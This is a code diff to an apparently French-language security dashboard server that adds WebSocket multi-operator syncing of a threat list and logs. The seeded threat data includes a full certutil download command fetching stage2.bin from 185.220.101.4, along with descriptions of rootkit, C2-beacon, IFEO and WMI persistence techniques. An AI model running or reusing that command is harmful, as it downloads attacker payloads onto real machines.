@@ -1,4 +1,6 @@
 import express from 'express';
+import http from 'http';
+import { WebSocketServer, WebSocket } from 'ws';
 import os from 'os';
 import { exec } from 'child_process';
 import { promisify } from 'util';
@@ -592,6 +594,269 @@ async function startServer() {
     }
   });
 
+  // =========================================================================
+  // SHARED STATE ENGINE & MULTI-USER SYNCHRONIZATION
+  // =========================================================================
+  const sharedState = {
+    threats: [
+      {
+        id: 't1',
+        name: 'Rootkit Driver Hook (Inaccessible aux Admins)',
+        category: 'Rootkit',
+        severity: 'CRITICAL',
+        targetPath: 'C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
+        mitreTechnique: 'T1014 - Rootkit Hooking',
+        lockedBySystem: true,
+        trustedInstallerLocked: true,
+        description: 'Pilote interceptant IRP_MJ_CREATE avec propriété verrouillée par NT SERVICE\\TrustedInstaller.',
+        status: 'ACTIVE',
+      },
+      {
+        id: 't2',
+        name: 'Trojan Swisyn Watchdog & C2 Beacon (Port 4444)',
+        category: 'Trojan',
+        severity: 'HIGH',
+        targetPath: 'C:\\Users\\User\\AppData\\Local\\Temp\\svch0st_updater.exe',
+        mitreTechnique: 'T1059.001 - PowerShell / T1071.001 C2',
+        lockedBySystem: true,
+        trustedInstallerLocked: false,
+        description: 'Processus mimant le service hôte Windows, communicant vers 185.220.101.4 avec surveillance mutuelle.',
+        status: 'ACTIVE',
+      },
+      {
+        id: 't3',
+        name: 'Abus LOLBin certutil.exe (Téléchargement Furtif)',
+        category: 'Persistence',
+        severity: 'MEDIUM',
+        targetPath: 'certutil.exe -urlcache -split -f http://185.220.101.4/stage2.bin',
+        mitreTechnique: 'T1105 - Ingress Tool Transfer',
+        lockedBySystem: false,
+        trustedInstallerLocked: false,
+        description: 'Téléchargement d\'un binaire encodé en utilisant un composant légitime de certificats Windows.',
+        status: 'ACTIVE',
+      },
+      {
+        id: 't4',
+        name: 'Piège IFEO Debugger sur Taskmgr & Defender',
+        category: 'Privilege',
+        severity: 'CRITICAL',
+        targetPath: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe',
+        mitreTechnique: 'T1546.012 - IFEO Debugger Trap',
+        lockedBySystem: false,
+        trustedInstallerLocked: true,
+        description: 'Détournement du Gestionnaire des Tâches via clé Debugger malveillante interdisant l\'inspection de la mémoire.',
+        status: 'ACTIVE',
+      },
+      {
+        id: 't5',
+        name: 'Abonnement Persistant WMI EventConsumer',
+        category: 'Persistence',
+        severity: 'HIGH',
+        targetPath: 'root\\subscription:__EventFilter -> svch0st_revive',
+        mitreTechnique: 'T1546.003 - WMI Event Subscription',
+        lockedBySystem: false,
+        trustedInstallerLocked: false,
+        description: 'Déclenchement automatique d\'une charge utile PowerShell masquée à chaque redémarrage ou intervalle fixe.',
+        status: 'ACTIVE',
+      },
+      {
+        id: 't6',
+        name: 'Flux NTFS Alternatif Caché (Zone.Identifier ADS)',
+        category: 'Memory',
+        severity: 'MEDIUM',
+        targetPath: 'C:\\Users\\Public\\payload.dll:hidden_stream',
+        mitreTechnique: 'T1564.004 - Alternate Data Streams',
+        lockedBySystem: false,
+        trustedInstallerLocked: false,
+        description: 'Binaire DLL dissimulé derrière un flux de données alternatif NTFS pour contourner les contrôles antiviraux superficiels.',
+        status: 'ACTIVE',
+      },
+    ],
+    logs: [
+      {
+        id: 'log-init-1',
+        timestamp: '07:35:01',
+        level: 'INFO',
+        tag: 'SYSTEM',
+        text: 'Initialisation de SpaceSec CyberDefense Suite v3.0 KERNEL EDITION...',
+      },
+      {
+        id: 'log-init-2',
+        timestamp: '07:35:02',
+        level: 'OK',
+        tag: 'ELEVATION',
+        text: 'Vérification du bouclier UAC : Privilèges Administrateur confirmés (SID S-1-5-32-544).',
+      },
+      {
+        id: 'log-init-3',
+        timestamp: '07:35:02',
+        level: 'KERNEL',
+        tag: 'P/INVOKE',
+        text: 'Acquisition des privilèges NT : SeDebugPrivilege et SeTakeOwnershipPrivilege activés avec succès.',
+      },
+      {
+        id: 'log-init-4',
+        timestamp: '07:35:03',
+        level: 'INFO',
+        tag: 'DEFENDER',
+        text: 'Contrôle MpCmdRun.exe : Moteur de protection en temps réel détecté actif.',
+      },
+      {
+        id: 'log-init-5',
+        timestamp: '07:35:05',
+        level: 'WARN',
+        tag: 'C2-HUNTER',
+        text: 'Connexion réseau suspecte détectée sur le port 4444 (PID 5824: svch0st_updater.exe -> 185.220.101.4).',
+      },
+      {
+        id: 'log-init-6',
+        timestamp: '07:35:06',
+        level: 'ERROR',
+        tag: 'KERNEL-LOCK',
+        text: 'Fichier verrouillé par handle noyau ou TrustedInstaller : C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
+      },
+    ],
+    blockedIps: [] as string[],
+    blockedWifiBssids: [] as string[],
+    activeUsersCount: 1,
+    lastModified: new Date().toISOString(),
+  };
+
+  interface OperatorClient {
+    id: string;
+    name: string;
+    role: string;
+    ip: string;
+    connectedAt: string;
+    status: 'ONLINE' | 'IDLE';
+  }
+
+  const clientSessions = new Map<WebSocket, OperatorClient>();
+  let operatorSequence = 1;
+
+  const connectedClients = new Set<WebSocket>();
+
+  const getActiveOperators = (): OperatorClient[] => {
+    return Array.from(clientSessions.values());
+  };
+
+  const broadcastToAll = (message: any, excludeWs?: WebSocket) => {
+    const payload = JSON.stringify(message);
+    connectedClients.forEach(client => {
+      if (client !== excludeWs && client.readyState === WebSocket.OPEN) {
+        try {
+          client.send(payload);
+        } catch {}
+      }
+    });
+  };
+
+  // REST API: Get current synchronized state (used on initial load or reconnect)
+  app.get('/api/shared/state', (req, res) => {
+    res.json({
+      success: true,
+      state: {
+        ...sharedState,
+        activeUsersCount: Math.max(1, connectedClients.size),
+        activeOperators: getActiveOperators(),
+      },
+    });
+  });
+
+  // REST API: Mutate shared state (fallback if WS unavailable)
+  app.post('/api/shared/mutate', (req, res) => {
+    const { action, payload, operator } = req.body;
+    if (!action) {
+      return res.status(400).json({ success: false, error: 'Action required' });
+    }
+
+    if (action === 'UPDATE_THREAT_STATUS') {
+      const { threatId, status, targetPath } = payload;
+      sharedState.threats = sharedState.threats.map(t =>
+        t.id === threatId || (targetPath && t.targetPath === targetPath) ? { ...t, status } : t
+      );
+    } else if (action === 'ADD_LOG') {
+      sharedState.logs = [...sharedState.logs.slice(-200), payload];
+    } else if (action === 'BLOCK_IP') {
+      if (!sharedState.blockedIps.includes(payload.ip)) {
+        sharedState.blockedIps.push(payload.ip);
+      }
+    } else if (action === 'UNBLOCK_IP') {
+      sharedState.blockedIps = sharedState.blockedIps.filter(ip => ip !== payload.ip);
+    } else if (action === 'BLOCK_WIFI_BSSID') {
+      if (!sharedState.blockedWifiBssids.includes(payload.bssid)) {
+        sharedState.blockedWifiBssids.push(payload.bssid);
+      }
+    } else if (action === 'BULK_UPDATE_THREAT_STATUS') {
+      const { threatIds, status, command } = payload;
+      const idSet = new Set(Array.isArray(threatIds) ? threatIds : []);
+      sharedState.threats = sharedState.threats.map(t =>
+        idSet.has(t.id) ? { ...t, status } : t
+      );
+      if (command) {
+        sharedState.logs = [
+          ...sharedState.logs.slice(-200),
+          {
+            id: `log-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
+            timestamp: new Date().toLocaleTimeString('fr-FR'),
+            level: 'OK',
+            text: `[COMMANDE-PARTAGÉE] Exécution groupée (${idSet.size} cibles) : "${command}" -> Statut: ${status}`,
+            tag: 'BULK-OP',
+          },
+        ];
+      }
+    } else if (action === 'DISMISS_THREATS') {
+      const { threatIds } = payload;
+      const idSet = new Set(Array.isArray(threatIds) ? threatIds : []);
+      sharedState.threats = sharedState.threats.map(t =>
+        idSet.has(t.id) ? { ...t, status: 'DISMISSED' } : t
+      );
+      sharedState.logs = [
+        ...sharedState.logs.slice(-200),
+        {
+          id: `log-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
+          timestamp: new Date().toLocaleTimeString('fr-FR'),
+          level: 'WARN',
+          text: `[REJET-MASSE] ${idSet.size} menace(s) ignorée(s)/rejetée(s) par l'opérateur.`,
+          tag: 'DISMISS',
+        },
+      ];
+    } else if (action === 'RESTORE_THREATS') {
+      const { threatIds } = payload;
+      const idSet = new Set(Array.isArray(threatIds) ? threatIds : []);
+      sharedState.threats = sharedState.threats.map(t =>
+        idSet.has(t.id) ? { ...t, status: 'ACTIVE' } : t
+      );
+      sharedState.logs = [
+        ...sharedState.logs.slice(-200),
+        {
+          id: `log-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
+          timestamp: new Date().toLocaleTimeString('fr-FR'),
+          level: 'INFO',
+          text: `[RESTAURATION] ${idSet.size} menace(s) réactivée(s) dans la liste d'observation.`,
+          tag: 'RESTORE',
+        },
+      ];
+    } else if (action === 'RESET_THREATS') {
+      sharedState.threats = sharedState.threats.map(t => ({ ...t, status: 'ACTIVE' }));
+    }
+
+    sharedState.lastModified = new Date().toISOString();
+    broadcastToAll({
+      type: 'STATE_DELTA',
+      action,
+      payload,
+      senderOperator: operator,
+      state: {
+        ...sharedState,
+        activeUsersCount: Math.max(1, connectedClients.size),
+        activeOperators: getActiveOperators(),
+      },
+    });
+
+    res.json({ success: true, state: sharedState });
+  });
+
   // Mount Vite middleware in development
   if (process.env.NODE_ENV !== 'production') {
     const vite = await createViteServer({
@@ -606,8 +871,179 @@ async function startServer() {
     });
   }
 
-  app.listen(PORT, '0.0.0.0', () => {
-    console.log(`[SpaceSec Live Server] Running on http://0.0.0.0:${PORT}`);
+  // Create HTTP Server & Mount WebSocket Server on same port 3000
+  const httpServer = http.createServer(app);
+  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
+
+  wss.on('connection', (ws, req) => {
+    connectedClients.add(ws);
+    const activeCount = connectedClients.size;
+    sharedState.activeUsersCount = activeCount;
+
+    const opNum = operatorSequence++;
+    const opTitles = ['Analyste Principal SOC', 'Ingénieur Réponse à Incident', 'Opérateur Kernel & Forensics', 'Spécialiste Threat Hunting'];
+    const opRole = opNum === 1 ? opTitles[0] : opTitles[(opNum - 1) % opTitles.length];
+    const opSession: OperatorClient = {
+      id: `OP-${opNum.toString().padStart(2, '0')}`,
+      name: `Analyste #${opNum}`,
+      role: opRole,
+      ip: req.socket.remoteAddress || 'Poste Local',
+      connectedAt: new Date().toLocaleTimeString('fr-FR'),
+      status: 'ONLINE',
+    };
+    clientSessions.set(ws, opSession);
+
+    const activeOperators = getActiveOperators();
+
+    // 1. Send full current authoritative state immediately to the newly connected user
+    ws.send(JSON.stringify({
+      type: 'SYNC_INIT',
+      operator: opSession,
+      activeOperators,
+      state: {
+        ...sharedState,
+        activeUsersCount: activeCount,
+        activeOperators,
+      },
+    }));
+
+    // 2. Notify all existing users that a new operator joined the command room
+    broadcastToAll({
+      type: 'USER_JOINED',
+      operator: opSession,
+      activeOperators,
+      activeUsersCount: activeCount,
+      timestamp: new Date().toLocaleTimeString('fr-FR'),
+    }, ws);
+
+    ws.on('message', (data) => {
+      try {
+        const msg = JSON.parse(data.toString());
+        if (msg.type === 'MUTATE') {
+          const { action, payload } = msg;
+
+          if (action === 'UPDATE_THREAT_STATUS') {
+            sharedState.threats = sharedState.threats.map(t =>
+              t.id === payload.threatId || (payload.targetPath && t.targetPath === payload.targetPath)
+                ? { ...t, status: payload.status }
+                : t
+            );
+          } else if (action === 'ADD_LOG') {
+            sharedState.logs = [...sharedState.logs.slice(-200), payload];
+          } else if (action === 'BLOCK_IP') {
+            if (!sharedState.blockedIps.includes(payload.ip)) {
+              sharedState.blockedIps.push(payload.ip);
+            }
+          } else if (action === 'UNBLOCK_IP') {
+            sharedState.blockedIps = sharedState.blockedIps.filter(ip => ip !== payload.ip);
+          } else if (action === 'BLOCK_WIFI_BSSID') {
+            if (!sharedState.blockedWifiBssids.includes(payload.bssid)) {
+              sharedState.blockedWifiBssids.push(payload.bssid);
+            }
+          } else if (action === 'BULK_UPDATE_THREAT_STATUS') {
+            const { threatIds, status, command } = payload;
+            const idSet = new Set(Array.isArray(threatIds) ? threatIds : []);
+            sharedState.threats = sharedState.threats.map(t =>
+              idSet.has(t.id) ? { ...t, status } : t
+            );
+            if (command) {
+              sharedState.logs = [
+                ...sharedState.logs.slice(-200),
+                {
+                  id: `log-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
+                  timestamp: new Date().toLocaleTimeString('fr-FR'),
+                  level: 'OK',
+                  text: `[COMMANDE-PARTAGÉE] Exécution groupée (${idSet.size} cibles) par ${opSession.name} : "${command}" -> Statut: ${status}`,
+                  tag: 'BULK-OP',
+                },
+              ];
+            }
+          } else if (action === 'DISMISS_THREATS') {
+            const { threatIds } = payload;
+            const idSet = new Set(Array.isArray(threatIds) ? threatIds : []);
+            sharedState.threats = sharedState.threats.map(t =>
+              idSet.has(t.id) ? { ...t, status: 'DISMISSED' } : t
+            );
+            sharedState.logs = [
+              ...sharedState.logs.slice(-200),
+              {
+                id: `log-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
+                timestamp: new Date().toLocaleTimeString('fr-FR'),
+                level: 'WARN',
+                text: `[REJET-MASSE] ${idSet.size} menace(s) ignorée(s)/rejetée(s) par ${opSession.name}.`,
+                tag: 'DISMISS',
+              },
+            ];
+          } else if (action === 'RESTORE_THREATS') {
+            const { threatIds } = payload;
+            const idSet = new Set(Array.isArray(threatIds) ? threatIds : []);
+            sharedState.threats = sharedState.threats.map(t =>
+              idSet.has(t.id) ? { ...t, status: 'ACTIVE' } : t
+            );
+            sharedState.logs = [
+              ...sharedState.logs.slice(-200),
+              {
+                id: `log-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
+                timestamp: new Date().toLocaleTimeString('fr-FR'),
+                level: 'INFO',
+                text: `[RESTAURATION] ${idSet.size} menace(s) réactivée(s) par ${opSession.name}.`,
+                tag: 'RESTORE',
+              },
+            ];
+          } else if (action === 'CLEAR_LOGS') {
+            sharedState.logs = [];
+          } else if (action === 'RESET_THREATS') {
+            sharedState.threats = sharedState.threats.map(t => ({ ...t, status: 'ACTIVE' }));
+          }
+
+          sharedState.lastModified = new Date().toISOString();
+
+          // Broadcast change to ALL other users in real time
+          broadcastToAll({
+            type: 'STATE_DELTA',
+            action,
+            payload,
+            senderOperator: opSession,
+            state: {
+              ...sharedState,
+              activeUsersCount: connectedClients.size,
+              activeOperators: getActiveOperators(),
+            },
+          }, ws);
+        } else if (msg.type === 'PING') {
+          ws.send(JSON.stringify({ type: 'PONG', timestamp: Date.now() }));
+        }
+      } catch (err) {
+        console.error('[WebSocket] Parse error:', err);
+      }
+    });
+
+    ws.on('close', () => {
+      const leavingOp = clientSessions.get(ws);
+      connectedClients.delete(ws);
+      clientSessions.delete(ws);
+
+      const remaining = connectedClients.size;
+      sharedState.activeUsersCount = Math.max(1, remaining);
+      const remainingOperators = getActiveOperators();
+
+      broadcastToAll({
+        type: 'USER_LEFT',
+        operator: leavingOp,
+        activeOperators: remainingOperators,
+        activeUsersCount: Math.max(1, remaining),
+        timestamp: new Date().toLocaleTimeString('fr-FR'),
+      });
+    });
+
+    ws.on('error', () => {
+      connectedClients.delete(ws);
+      clientSessions.delete(ws);
+    });
+  });
+
+  httpServer.listen(PORT, '0.0.0.0', () => {
+    console.log(`[SpaceSec Live Server & WebSocket Multi-User Engine] Running on http://0.0.0.0:${PORT}`);
   });
 }
 
